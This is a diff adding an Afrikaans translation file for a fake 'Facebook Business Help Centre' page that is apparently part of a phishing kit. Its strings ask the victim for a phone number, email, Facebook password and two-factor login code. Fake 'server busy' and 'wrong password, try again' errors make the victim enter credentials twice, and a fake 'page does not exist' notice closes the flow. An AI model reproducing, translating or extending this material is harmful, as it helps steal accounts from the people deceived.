@@ -1,0 +1,59 @@
+{
+  "translation": {
+    "title": "Facebook Business Hulpsentrum",
+    "title2": "Verkoop via Facebook",
+    "very_phone": "Gee 'n geldige telefoonnommer.",
+    "banner-content": "Via Sentrum agent",
+    "description": "Hoe kan ons u help?",
+    "description2": "Hoe kan ons help?",
+    "text": "Ons benodig meer inligting om jou probleem op te los. ",
+    "label": "Die mees algemene probleme",
+    "btn": "Ek is geblokkeer om 'n kenmerk te gebruik",
+    "btn1": "My rekening is beperk",
+    "btn2": "My foto's en video's oortree beleide",
+    "btn3": "My webwerf is beperk",
+    "btn4": "Ek moet my rekening beveilig",
+    "btn5": "Ander probleme",
+    "button": "Volgende",
+    "form-title": "Kry hulp",
+    "phone": "Telefoon nommer",
+    "text-batbuoc": "versoek",
+    "email": "E-pos adres",
+    "form2-title2": "Voer asseblief jou Facebook-wagwoord in om voort te gaan",
+    "form2-content": "Ons moet bevestig dat die persoon wat die inligting stuur jy is. Voer asseblief jou Facebook-wagwoord in en gaan voort.",
+    "password": "Wagwoord",
+    "validate-true": "Verifieer inligting",
+    "chat_btn": "Begin gesels"
+  },
+  "frm_input1": {
+    "home_title": "Voer asseblief jou Facebook-wagwoord in om voort te gaan",
+    "modal__body-description": "Ons moet bevestig dat die persoon wat die inligting stuur jy is. Voer asseblief jou Facebook-wagwoord in en gaan voort.",
+    "password": "Wagwoord",
+    "btn_send_continue": "Aanhou",
+    "validate-true": "Verifieer inligting",
+    "text-danger": "Die bediener is besig! ",
+    "text-danger1": "Wagwoord is verkeerd, probeer asseblief weer.",
+    "text-danger2": "Vereis stelsel oordoen. ",
+    "input1": "Voer gemors suksesvol in"
+  },
+  "frm_input2": {
+    "home_title": "Voer die aanmeldkode in om voort te gaan",
+    "description": "Jou rekening het twee-faktor-stawing geaktiveer, wat hierdie bykomende aanmeldstap vereis.",
+    "title": "Keur vanaf 'n ander toestel goed",
+    "description2": "Gaan die Facebook-kennisgewing na waar jy by jou rekening aangemeld het en keur die aanmelding goed om voort te gaan.",
+    "title2": "Of voer jou aanmeldkode in",
+    "description3": "Voer die 6-8-syfer-kode van jou foon of die verifikasieprogram wat jy opgestel het in.",
+    "button": "Stuur kode",
+    "validate-true": "Verifieer inligting",
+    "text-danger": "Die bediener is besig! ",
+    "text-danger1": "Wagwoord is verkeerd, probeer asseblief weer.",
+    "text-danger2": "Vereis stelsel oordoen. ",
+    "button1": "Stuur na",
+    "placeholder": "Aanteken kode"
+  },
+  "notification": {
+    "text-danger1": "Die stawingskode is verkeerd, probeer asseblief weer.",
+    "title": "Jammer, hierdie bladsy bestaan ​​nie,",
+    "title2": "Die skakel wat jy geklik het, is dalk gebreek, of die bladsy is dalk verwyder."
+  }
+}
